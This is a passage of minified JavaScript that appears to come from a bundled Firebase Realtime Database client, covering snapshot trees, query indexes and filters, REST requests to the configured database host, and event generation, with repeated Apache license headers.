this.getReverseIteratorFrom(e.maxPost(),e)}getReverseIteratorFrom(e,n){const r=this.resolveIndex_(n);if(r)return r.getReverseIteratorFrom(e,s=>s);{const s=this.children_.getReverseIteratorFrom(e.name,se.Wrap);let o=s.peek();for(;o!=null&&n.compare(o,e)>0;)s.getNext(),o=s.peek();return s}}compareTo(e){return this.isEmpty()?e.isEmpty()?0:-1:e.isLeafNode()||e.isEmpty()?1:e===vo?-1:0}withIndex(e){if(e===bs||this.indexMap_.hasIndex(e))return this;{const n=this.indexMap_.addIndex(e,this.children_);return new J(this.children_,this.priorityNode_,n)}}isIndexed(e){return e===bs||this.indexMap_.hasIndex(e)}equals(e){if(e===this)return!0;if(e.isLeafNode())return!1;{const n=e;if(this.getPriority().equals(n.getPriority()))if(this.children_.count()===n.children_.count()){const r=this.getIterator(Ae),s=n.getIterator(Ae);let o=r.getNext(),a=s.getNext();for(;o&&a;){if(o.name!==a.name||!o.node.equals(a.node))return!1;o=r.getNext(),a=s.getNext()}return o===null&&a===null}else return!1;else return!1}}resolveIndex_(e){return e===bs?null:this.indexMap_.get(e.toString())}}J.INTEGER_REGEXP_=/^(0|[1-9]\d*)$/;class YS extends J{constructor(){super(new wt(Ku),J.EMPTY_NODE,Nn.Default)}compareTo(e){return e===this?0:1}equals(e){return e===this}getPriority(){return this}getImmediateChild(e){return J.EMPTY_NODE}isEmpty(){return!1}}const vo=new YS;Object.defineProperties(se,{MIN:{value:new se(Is,J.EMPTY_NODE)},MAX:{value:new se(zr,vo)}});ev.__EMPTY_NODE=J.EMPTY_NODE;Ge.__childrenNodeConstructor=J;$S(vo);US(vo);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const KS=!0;function Be(t,e=null){if(t===null)return J.EMPTY_NODE;if(typeof t=="object"&&".priority"in t&&(e=t[".priority"]),$(e===null||typeof e=="string"||typeof e=="number"||typeof e=="object"&&".sv"in e,"Invalid priority type found: "+typeof e),typeof t=="object"&&".value"in t&&t[".value"]!==null&&(t=t[".value"]),typeof t!="object"||".sv"in t){const n=t;return new Ge(n,Be(e))}if(!(t instanceof Array)&&KS){const n=[];let r=!1;if(nt(t,(a,l)=>{if(a.substring(0,1)!=="."){const c=Be(l);c.isEmpty()||(r=r||!c.getPriority().isEmpty(),n.push(new se(a,c)))}}),n.length===0)return J.EMPTY_NODE;const o=Wa(n,WS,a=>a.name,Ku);if(r){const a=Wa(n,Ae.getCompare());return new J(o,Be(e),new Nn({".priority":a},{".priority":Ae}))}else return new J(o,Be(e),Nn.Default)}else{let n=J.EMPTY_NODE;return nt(t,(r,s)=>{if(gn(t,r)&&r.substring(0,1)!=="."){const o=Be(s);(o.isLeafNode()||!o.isEmpty())&&(n=n.updateImmediateChild(r,o))}}),n.updatePriority(Be(e))}}BS(Be);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class QS extends yl{constructor(e){super(),this.indexPath_=e,$(!ie(e)&&re(e)!==".priority","Can't create PathIndex with empty path or .priority key")}extractChild(e){return e.getChild(this.indexPath_)}isDefinedOn(e){return!e.getChild(this.indexPath_).isEmpty()}compare(e,n){const r=this.extractChild(e.node),s=this.extractChild(n.node),o=r.compareTo(s);return o===0?Br(e.name,n.name):o}makePost(e,n){const r=Be(e),s=J.EMPTY_NODE.updateChild(this.indexPath_,r);return new se(n,s)}maxPost(){const e=J.EMPTY_NODE.updateChild(this.indexPath_,vo);return new se(zr,e)}toString(){return Ji(this.indexPath_,0).join("/")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qS extends yl{compare(e,n){const r=e.node.compareTo(n.node);return r===0?Br(e.name,n.name):r}isDefinedOn(e){return!0}indexedValueChanged(e,n){return!e.equals(n)}minPost(){return se.MIN}maxPost(){return se.MAX}makePost(e,n){const r=Be(e);return new se(n,r)}toString(){return".value"}}const XS=new qS;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function iv(t){return{type:"value",snapshotNode:t}}function Rs(t,e){return{type:"child_added",snapshotNode:e,childName:t}}function Zi(t,e){return{type:"child_removed",snapshotNode:e,childName:t}}function eo(t,e,n){return{type:"child_changed",snapshotNode:e,childName:t,oldSnap:n}}function JS(t,e){return{type:"child_moved",snapshotNode:e,childName:t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qu{constructor(e){this.index_=e}updateChild(e,n,r,s,o,a){$(e.isIndexed(this.index_),"A node must be indexed if only a child is updated");const l=e.getImmediateChild(n);return l.getChild(s).equals(r.getChild(s))&&l.isEmpty()===r.isEmpty()||(a!=null&&(r.isEmpty()?e.hasChild(n)?a.trackChildChange(Zi(n,l)):$(e.isLeafNode(),"A child remove without an old child only makes sense on a leaf node"):l.isEmpty()?a.trackChildChange(Rs(n,r)):a.trackChildChange(eo(n,r,l))),e.isLeafNode()&&r.isEmpty())?e:e.updateImmediateChild(n,r).withIndex(this.index_)}updateFullNode(e,n,r){return r!=null&&(e.isLeafNode()||e.forEachChild(Ae,(s,o)=>{n.hasChild(s)||r.trackChildChange(Zi(s,o))}),n.isLeafNode()||n.forEachChild(Ae,(s,o)=>{if(e.hasChild(s)){const a=e.getImmediateChild(s);a.equals(o)||r.trackChildChange(eo(s,o,a))}else r.trackChildChange(Rs(s,o))})),n.withIndex(this.index_)}updatePriority(e,n){return e.isEmpty()?J.EMPTY_NODE:e.updatePriority(n)}filtersNodes(){return!1}getIndexedFilter(){return this}getIndex(){return this.index_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class to{constructor(e){this.indexedFilter_=new Qu(e.getIndex()),this.index_=e.getIndex(),this.startPost_=to.getStartPost_(e),this.endPost_=to.getEndPost_(e),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}getStartPost(){return this.startPost_}getEndPost(){return this.endPost_}matches(e){const n=this.startIsInclusive_?this.index_.compare(this.getStartPost(),e)<=0:this.index_.compare(this.getStartPost(),e)<0,r=this.endIsInclusive_?this.index_.compare(e,this.getEndPost())<=0:this.index_.compare(e,this.getEndPost())<0;return n&&r}updateChild(e,n,r,s,o,a){return this.matches(new se(n,r))||(r=J.EMPTY_NODE),this.indexedFilter_.updateChild(e,n,r,s,o,a)}updateFullNode(e,n,r){n.isLeafNode()&&(n=J.EMPTY_NODE);let s=n.withIndex(this.index_);s=s.updatePriority(J.EMPTY_NODE);const o=this;return n.forEachChild(Ae,(a,l)=>{o.matches(new se(a,l))||(s=s.updateImmediateChild(a,J.EMPTY_NODE))}),this.indexedFilter_.updateFullNode(e,s,r)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.indexedFilter_}getIndex(){return this.index_}static getStartPost_(e){if(e.hasStart()){const n=e.getIndexStartName();return e.getIndex().makePost(e.getIndexStartValue(),n)}else return e.getIndex().minPost()}static getEndPost_(e){if(e.hasEnd()){const n=e.getIndexEndName();return e.getIndex().makePost(e.getIndexEndValue(),n)}else return e.getIndex().maxPost()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ZS{constructor(e){this.withinDirectionalStart=n=>this.reverse_?this.withinEndPost(n):this.withinStartPost(n),this.withinDirectionalEnd=n=>this.reverse_?this.withinStartPost(n):this.withinEndPost(n),this.withinStartPost=n=>{const r=this.index_.compare(this.rangedFilter_.getStartPost(),n);return this.startIsInclusive_?r<=0:r<0},this.withinEndPost=n=>{const r=this.index_.compare(n,this.rangedFilter_.getEndPost());return this.endIsInclusive_?r<=0:r<0},this.rangedFilter_=new to(e),this.index_=e.getIndex(),this.limit_=e.getLimit(),this.reverse_=!e.isViewFromLeft(),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}updateChild(e,n,r,s,o,a){return this.rangedFilter_.matches(new se(n,r))||(r=J.EMPTY_NODE),e.getImmediateChild(n).equals(r)?e:e.numChildren()<this.limit_?this.rangedFilter_.getIndexedFilter().updateChild(e,n,r,s,o,a):this.fullLimitUpdateChild_(e,n,r,o,a)}updateFullNode(e,n,r){let s;if(n.isLeafNode()||n.isEmpty())s=J.EMPTY_NODE.withIndex(this.index_);else if(this.limit_*2<n.numChildren()&&n.isIndexed(this.index_)){s=J.EMPTY_NODE.withIndex(this.index_);let o;this.reverse_?o=n.getReverseIteratorFrom(this.rangedFilter_.getEndPost(),this.index_):o=n.getIteratorFrom(this.rangedFilter_.getStartPost(),this.index_);let a=0;for(;o.hasNext()&&a<this.limit_;){const l=o.getNext();if(this.withinDirectionalStart(l))if(this.withinDirectionalEnd(l))s=s.updateImmediateChild(l.name,l.node),a++;else break;else continue}}else{s=n.withIndex(this.index_),s=s.updatePriority(J.EMPTY_NODE);let o;this.reverse_?o=s.getReverseIterator(this.index_):o=s.getIterator(this.index_);let a=0;for(;o.hasNext();){const l=o.getNext();a<this.limit_&&this.withinDirectionalStart(l)&&this.withinDirectionalEnd(l)?a++:s=s.updateImmediateChild(l.name,J.EMPTY_NODE)}}return this.rangedFilter_.getIndexedFilter().updateFullNode(e,s,r)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.rangedFilter_.getIndexedFilter()}getIndex(){return this.index_}fullLimitUpdateChild_(e,n,r,s,o){let a;if(this.reverse_){const f=this.index_.getCompare();a=(u,b)=>f(b,u)}else a=this.index_.getCompare();const l=e;$(l.numChildren()===this.limit_,"");const c=new se(n,r),d=this.reverse_?l.getFirstChild(this.index_):l.getLastChild(this.index_),p=this.rangedFilter_.matches(c);if(l.hasChild(n)){const f=l.getImmediateChild(n);let u=s.getChildAfterChild(this.index_,d,this.reverse_);for(;u!=null&&(u.name===n||l.hasChild(u.name));)u=s.getChildAfterChild(this.index_,u,this.reverse_);const b=u==null?1:a(u,c);if(p&&!r.isEmpty()&&b>=0)return o!=null&&o.trackChildChange(eo(n,r,f)),l.updateImmediateChild(n,r);{o!=null&&o.trackChildChange(Zi(n,f));const v=l.updateImmediateChild(n,J.EMPTY_NODE);return u!=null&&this.rangedFilter_.matches(u)?(o!=null&&o.trackChildChange(Rs(u.name,u.node)),v.updateImmediateChild(u.name,u.node)):v}}else return r.isEmpty()?e:p&&a(d,c)>=0?(o!=null&&(o.trackChildChange(Zi(d.name,d.node)),o.trackChildChange(Rs(n,r))),l.updateImmediateChild(n,r).updateImmediateChild(d.name,J.EMPTY_NODE)):e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qu{constructor(){this.limitSet_=!1,this.startSet_=!1,this.startNameSet_=!1,this.startAfterSet_=!1,this.endSet_=!1,this.endNameSet_=!1,this.endBeforeSet_=!1,this.limit_=0,this.viewFrom_="",this.indexStartValue_=null,this.indexStartName_="",this.indexEndValue_=null,this.indexEndName_="",this.index_=Ae}hasStart(){return this.startSet_}isViewFromLeft(){return this.viewFrom_===""?this.startSet_:this.viewFrom_==="l"}getIndexStartValue(){return $(this.startSet_,"Only valid if start has been set"),this.indexStartValue_}getIndexStartName(){return $(this.startSet_,"Only valid if start has been set"),this.startNameSet_?this.indexStartName_:Is}hasEnd(){return this.endSet_}getIndexEndValue(){return $(this.endSet_,"Only valid if end has been set"),this.indexEndValue_}getIndexEndName(){return $(this.endSet_,"Only valid if end has been set"),this.endNameSet_?this.indexEndName_:zr}hasLimit(){return this.limitSet_}hasAnchoredLimit(){return this.limitSet_&&this.viewFrom_!==""}getLimit(){return $(this.limitSet_,"Only valid if limit has been set"),this.limit_}getIndex(){return this.index_}loadsAllData(){return!(this.startSet_||this.endSet_||this.limitSet_)}isDefault(){return this.loadsAllData()&&this.index_===Ae}copy(){const e=new qu;return e.limitSet_=this.limitSet_,e.limit_=this.limit_,e.startSet_=this.startSet_,e.startAfterSet_=this.startAfterSet_,e.indexStartValue_=this.indexStartValue_,e.startNameSet_=this.startNameSet_,e.indexStartName_=this.indexStartName_,e.endSet_=this.endSet_,e.endBeforeSet_=this.endBeforeSet_,e.indexEndValue_=this.indexEndValue_,e.endNameSet_=this.endNameSet_,e.indexEndName_=this.indexEndName_,e.index_=this.index_,e.viewFrom_=this.viewFrom_,e}}function eC(t){return t.loadsAllData()?new Qu(t.getIndex()):t.hasLimit()?new ZS(t):new to(t)}function fh(t){const e={};if(t.isDefault())return e;let n;if(t.index_===Ae?n="$priority":t.index_===XS?n="$value":t.index_===bs?n="$key":($(t.index_ instanceof QS,"Unrecognized index type!"),n=t.index_.toString()),e.orderBy=Ue(n),t.startSet_){const r=t.startAfterSet_?"startAfter":"startAt";e[r]=Ue(t.indexStartValue_),t.startNameSet_&&(e[r]+=","+Ue(t.indexStartName_))}if(t.endSet_){const r=t.endBeforeSet_?"endBefore":"endAt";e[r]=Ue(t.indexEndValue_),t.endNameSet_&&(e[r]+=","+Ue(t.indexEndName_))}return t.limitSet_&&(t.isViewFromLeft()?e.limitToFirst=t.limit_:e.limitToLast=t.limit_),e}function hh(t){const e={};if(t.startSet_&&(e.sp=t.indexStartValue_,t.startNameSet_&&(e.sn=t.indexStartName_),e.sin=!t.startAfterSet_),t.endSet_&&(e.ep=t.indexEndValue_,t.endNameSet_&&(e.en=t.indexEndName_),e.ein=!t.endBeforeSet_),t.limitSet_){e.l=t.limit_;let n=t.viewFrom_;n===""&&(t.isViewFromLeft()?n="l":n="r"),e.vf=n}return t.index_!==Ae&&(e.i=t.index_.toString()),e}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $a extends qx{constructor(e,n,r,s){super(),this.repoInfo_=e,this.onDataUpdate_=n,this.authTokenProvider_=r,this.appCheckTokenProvider_=s,this.log_=xo("p:rest:"),this.listens_={}}reportStats(e){throw new Error("Method not implemented.")}static getListenId_(e,n){return n!==void 0?"tag$"+n:($(e._queryParams.isDefault(),"should have a tag if it's not a default query."),e._path.toString())}listen(e,n,r,s){const o=e._path.toString();this.log_("Listen called for "+o+" "+e._queryIdentifier);const a=$a.getListenId_(e,r),l={};this.listens_[a]=l;const c=fh(e._queryParams);this.restRequest_(o+".json",c,(d,p)=>{let f=p;if(d===404&&(f=null,d=null),d===null&&this.onDataUpdate_(o,f,!1,r),Es(this.listens_,a)===l){let u;d?d===401?u="permission_denied":u="rest_error:"+d:u="ok",s(u,null)}})}unlisten(e,n){const r=$a.getListenId_(e,n);delete this.listens_[r]}get(e){const n=fh(e._queryParams),r=e._path.toString(),s=new ho;return this.restRequest_(r+".json",n,(o,a)=>{let l=a;o===404&&(l=null,o=null),o===null?(this.onDataUpdate_(r,l,!1,null),s.resolve(l)):s.reject(new Error(l))}),s.promise}refreshAuthToken(e){}restRequest_(e,n={},r){return n.format="export",Promise.all([this.authTokenProvider_.getToken(!1),this.appCheckTokenProvider_.getToken(!1)]).then(([s,o])=>{s&&s.accessToken&&(n.auth=s.accessToken),o&&o.token&&(n.ac=o.token);const a=(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host+e+"?ns="+this.repoInfo_.namespace+k_(n);this.log_("Sending REST request for "+a);const l=new XMLHttpRequest;l.onreadystatechange=()=>{if(r&&l.readyState===4){this.log_("REST Response for "+a+" received. status:",l.status,"response:",l.responseText);let c=null;if(l.status>=200&&l.status<300){try{c=Ki(l.responseText)}catch{ft("Failed to parse JSON response for "+a+": "+l.responseText)}r(null,c)}else l.status!==401&&l.status!==404&&ft("Got unsuccessful REST response for "+a+" Status: "+l.status),r(l.status);r=null}},l.open("GET",a,!0),l.send()})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tC{constructor(){this.rootNode_=J.EMPTY_NODE}getNode(e){return this.rootNode_.getChild(e)}updateSnapshot(e,n){this.rootNode_=this.rootNode_.updateChild(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ba(){return{value:null,children:new Map}}function ov(t,e,n){if(ie(e))t.value=n,t.children.clear();else if(t.value!==null)t.value=t.value.updateChild(e,n);else{const r=re(e);t.children.has(r)||t.children.set(r,Ba());const s=t.children.get(r);e=ve(e),ov(s,e,n)}}function jd(t,e,n){t.value!==null?n(e,t.value):nC(t,(r,s)=>{const o=new he(e.toString()+"/"+r);jd(s,o,n)})}function nC(t,e){t.children.forEach((n,r)=>{e(r,n)})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rC{constructor(e){this.collection_=e,this.last_=null}get(){const e=this.collection_.get(),n=Object.assign({},e);return this.last_&&nt(this.last_,(r,s)=>{n[r]=n[r]-s}),this.last_=e,n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const mh=10*1e3,sC=30*1e3,iC=5*60*1e3;class oC{constructor(e,n){this.server_=n,this.statsToReport_={},this.statsListener_=new rC(e);const r=mh+(sC-mh)*Math.random();ki(this.reportStats_.bind(this),Math.floor(r))}reportStats_(){const e=this.statsListener_.get(),n={};let r=!1;nt(e,(s,o)=>{o>0&&gn(this.statsToReport_,s)&&(n[s]=o,r=!0)}),r&&this.server_.reportStats(n),ki(this.reportStats_.bind(this),Math.floor(Math.random()*2*iC))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var en;(function(t){t[t.OVERWRITE=0]="OVERWRITE",t[t.MERGE=1]="MERGE",t[t.ACK_USER_WRITE=2]="ACK_USER_WRITE",t[t.LISTEN_COMPLETE=3]="LISTEN_COMPLETE"})(en||(en={}));function Xu(){return{fromUser:!0,fromServer:!1,queryId:null,tagged:!1}}function Ju(){return{fromUser:!1,fromServer:!0,queryId:null,tagged:!1}}function Zu(t){return{fromUser:!1,fromServer:!0,queryId:t,tagged:!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ua{constructor(e,n,r){this.path=e,this.affectedTree=n,this.revert=r,this.type=en.ACK_USER_WRITE,this.source=Xu()}operationForChild(e){if(ie(this.path)){if(this.affectedTree.value!=null)return $(this.affectedTree.children.isEmpty(),"affectedTree should not have overlapping affected paths."),this;{const n=this.affectedTree.subtree(new he(e));return new Ua(ue(),n,this.revert)}}else return $(re(this.path)===e,"operationForChild called for unrelated child."),new Ua(ve(this.path),this.affectedTree,this.revert)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class no{constructor(e,n){this.source=e,this.path=n,this.type=en.LISTEN_COMPLETE}operationForChild(e){return ie(this.path)?new no(this.source,ue()):new no(this.source,ve(this.path))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Mr{constructor(e,n,r){this.source=e,this.path=n,this.snap=r,this.type=en.OVERWRITE}operationForChild(e){return ie(this.path)?new Mr(this.source,ue(),this.snap.getImmediateChild(e)):new Mr(this.source,ve(this.path),this.snap)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ts{constructor(e,n,r){this.source=e,this.path=n,this.children=r,this.type=en.MERGE}operationForChild(e){if(ie(this.path)){const n=this.children.subtree(new he(e));return n.isEmpty()?null:n.value?new Mr(this.source,ue(),n.value):new Ts(this.source,ue(),n)}else return $(re(this.path)===e,"Can't get a merge for a child not on the path of the operation"),new Ts(this.source,ve(this.path),this.children)}toString(){return"Operation("+this.path+": "+this.source.toString()+" merge: "+this.children.toString()+")"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dr{constructor(e,n,r){this.node_=e,this.fullyInitialized_=n,this.filtered_=r}isFullyInitialized(){return this.fullyInitialized_}isFiltered(){return this.filtered_}isCompleteForPath(e){if(ie(e))return this.isFullyInitialized()&&!this.filtered_;const n=re(e);return this.isCompleteForChild(n)}isCompleteForChild(e){return this.isFullyInitialized()&&!this.filtered_||this.node_.hasChild(e)}getNode(){return this.node_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class aC{constructor(e){this.query_=e,this.index_=this.query_._queryParams.getIndex()}}function lC(t,e,n,r){const s=[],o=[];return e.forEach(a=>{a.type==="child_changed"&&t.index_.indexedValueChanged(a.oldSnap,a.snapshotNode)&&o.push(JS(a.childName,a.snapshotNode))}),ui(t,s,"child_removed",e,r,n),ui(t,s,"child_added",e,r,n),ui(t,s,"child_moved",o,r,n),ui(t,s,"child_changed",e,r,n),ui(t,s,"value",e,r,n),s}function ui(t,e,n,r,s,o){const a=r.filter(l=>l.type===n);a.sort((l,c)=>dC(t,l,c)),a.forEach(l=>{const c=cC(t,l,o);s.forEach(d=>{d.respondsTo(l.type)&&e.push(d.createEvent(c,t.query_))})})}function cC(t,e,n){return e.type==="value"||e.type==="child_removed"||(e.prevName=n.getPredecessorChildName(e.childName,e.snapshotNode,t.index_)),e}function dC(t,e,n){if(e.childName==null||n.childName==null)throw Ws("Should only compare child_ events.");const r=new se(e.childName,e.snapshotNode),s=new se(n.childName,n.snapshotNode);return t.index_.compare(r,s)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function bl(t,e){return{eventCache:t,serverCache:e}}function Ni(t,e,n,r){return bl(new dr(e,n,r),t.serverCache)}function av(t,e,n,r){return bl(t.eventCache,new dr(e,n,r))}function Ha(t){return t.eventCache.isFullyInitialized()?t.eventCache.getNode():null}function Or(t){return t.serverCache.isFullyInitialized()?t.serverCache.getNode():null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
